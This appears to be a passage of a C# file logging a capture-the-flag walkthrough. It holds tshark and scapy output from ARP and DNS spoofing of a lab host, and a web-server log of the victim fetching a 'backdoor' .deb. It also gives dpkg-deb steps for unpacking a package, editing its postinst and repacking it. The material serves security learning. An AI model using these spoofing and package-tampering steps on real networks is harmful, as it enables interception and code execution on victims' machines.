                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84


                guest@b19f4c3c04f9:~$ tshark -n                                                                                                             
                Capturing on 'eth0'                                                                                                                        
                    1 0.000000000 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
                    2 0.023991170 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
                    3 0.052358930    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
                    4 1.040034346 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
                    5 1.063910552 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
                    6 1.084385701    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
                    7 2.079993078 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
                    8 2.099982227 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
                    9 2.120378861    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
                   10 3.127982679 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
                   11 3.151950098 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
                   12 3.168600217    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
                   13 4.167959632 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
                   14 4.204196263 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
                   15 4.220402011    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
                   16 5.219938579 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
                   17 5.243955227 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
                   18 5.260375086    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org

            ".Blog(_logger, "Final ARP script is {arpscript}", "arp_resp_04.py");



            @"
                https://jasonmurray.org/posts/scapydns/
                dport=packet[UDP].sport,
                sport=packet[UDP].dport
            ".Blog(_logger, "Working on DNS now...");


            @"
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=9719
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=24411 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=24411
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=44865 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=44865
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=21870 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=21870
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=3814 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=3814
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=47329 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=47329
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=38174 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=38174
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=8476 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=8476
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=27723 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=27723
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=42743 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=42743
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=40064 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=40064
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=7904 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=7904
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=6510 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=6510
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=40911 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=40911
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=19645 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=19645
                                                                                                                                                            │
                ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                  188 7.649785362    10.6.6.35 → 10.6.0.4     TLSv1.3 286 Application Data, Application Data, Application Data
                  189 7.650477486     10.6.0.4 → 10.6.6.35    TCP 66 50768 → 64352 [ACK] Seq=810 Ack=2245 Win=64128 Len=0 TSval=3020227848 TSecr=1611965490
                  190 7.650584627     10.6.0.4 → 10.6.6.35    TCP 66 50768 → 64352 [FIN, ACK] Seq=810 Ack=2245 Win=64128 Len=0 TSval=3020227848 TSecr=1611965490
                  191 7.650608495    10.6.6.35 → 10.6.0.4     TCP 66 64352 → 50768 [ACK] Seq=2245 Ack=811 Win=64640 Len=0 TSval=1611965494 TSecr=3020227848
                  192 7.656692208 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04
                  193 7.673073041    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                  194 7.697342766    10.6.6.53 → 10.6.6.35    DNS 104 Standard query response 0x0000 A ftp.osuosl.org A 10.6.0.4
                  195 7.699907289     10.6.0.4 → 10.6.6.35    TCP 74 50772 → 64352 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=3020227897 TSecr=0 WS=128
                  196 8.672807313 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                  197 8.700693969 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04
                  198 8.704002672     10.6.0.4 → 10.6.6.35    TCP 74 [TCP Retransmission] 50772 → 64352 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=3020228901 TSecr=0 WS=128
                  199 8.704081393    10.6.6.35 → 10.6.0.4     TCP 74 64352 → 50772 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460 SACK_PERM=1 TSval=1611966547 TSecr=3020228901 WS=128
                  200 8.704103085     10.6.0.4 → 10.6.6.35    TCP 66 50772 → 64352 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=3020228901 TSecr=1611966547
                  201 8.704890201     10.6.0.4 → 10.6.6.35    TLSv1 583 Client Hello
                  202 8.704941104    10.6.6.35 → 10.6.0.4     TCP 66 64352 → 50772 [ACK] Seq=1 Ack=518 Win=64768 Len=0 TSval=1611966548 TSecr=3020228902
                  203 8.706094444    10.6.6.35 → 10.6.0.4     TLSv1.3 1579 Server Hello, Change Cipher Spec, Application Data, Application Data, Application Data, Application Data
                  204 8.706113019     10.6.0.4 → 10.6.6.35    TCP 66 50772 → 64352 [ACK] Seq=518 Ack=1514 Win=64128 Len=0 TSval=3020228903 TSecr=1611966549
                  205 8.706572890     10.6.0.4 → 10.6.6.35    TLSv1.3 146 Change Cipher Spec, Application Data
                  206 8.706787919    10.6.6.35 → 10.6.0.4     TLSv1.3 321 Application Data
                  207 8.706889103     10.6.0.4 → 10.6.6.35    TLSv1.3 278 Application Data
                  208 8.706912105    10.6.6.35 → 10.6.0.4     TLSv1.3 321 Application Data
                  209 8.709461212    10.6.6.35 → 10.6.0.4     TCP 74 43254 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=1611966553 TSecr=0 WS=128
                  210 8.709484337     10.6.0.4 → 10.6.6.35    TCP 54 80 → 43254 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
                  211 8.710391445    10.6.6.35 → 10.6.0.4     TLSv1.3 286 Application Data, Application Data, Application Data
                  212 8.711089848     10.6.0.4 → 10.6.6.35    TCP 66 50772 → 64352 [ACK] Seq=810 Ack=2245 Win=64128 Len=0 TSval=3020228908 TSecr=1611966550
                  213 8.711197824     10.6.0.4 → 10.6.6.35    TCP 66 50772 → 64352 [FIN, ACK] Seq=810 Ack=2245 Win=64128 Len=0 TSval=3020228908 TSecr=1611966550

            ".Blog(_logger, "We can see some new packets flying our way when running {tshark}... :) ", "tshark -n");

            @"
                => op =is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                  │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=13920
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=38582 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=38582
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=32989 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=32989
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=34817 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=34817
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=31409 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=31409
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=59144 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=59144
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=61144 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=61144
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=59206 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=59206
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=54464 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=54464
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=62160 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=62160
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=36632 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=36632
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=13897 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=13897
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=49061 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=49061
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=8866 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=8866
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=34580 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=34580
                ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                guest@10bd7aa40918:~/debs$ python3 -m http.server 80

                10.6.6.35 - - [30/Dec/2020 19:43:31] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:32] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:32] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:33] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:33] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:35] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:35] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:36] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:36] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:37] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:37] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:38] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:38] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:39] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:39] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:40] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:40] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:41] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:41] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:42] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:42] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 404 -
                10.6.6.35 - - [30/Dec/2020 19:43:43] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 19:43:43] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 404 -
            ".Blog(_logger, "When running {server} we can see that mr JF is trying to get deb file...  ", "python3 -m http.server 80");


            @"
                https://www.guardicore.com/2019/01/a-vulnerability-in-debians-apt-allows-for-easy-lateral-movement-in-data-centers

                https://unix.stackexchange.com/questions/138188/easily-unpack-deb-edit-postinst-and-repack-deb#:~:text=The%20primary%20command%20to%20manipulate%20deb%20packages%20is,tmp%20%23%20edit%20DEBIAN%2Fpostinst%20dpkg-deb%20-b%20tmp%20fixed.deb
                mkdir tmp
                dpkg-deb -R original.deb tmp
                # edit DEBIAN/postinst
                dpkg-deb -b tmp fixed.deb


                guest@10bd7aa40918:~/debs$ ls -hs
                total 2.5M
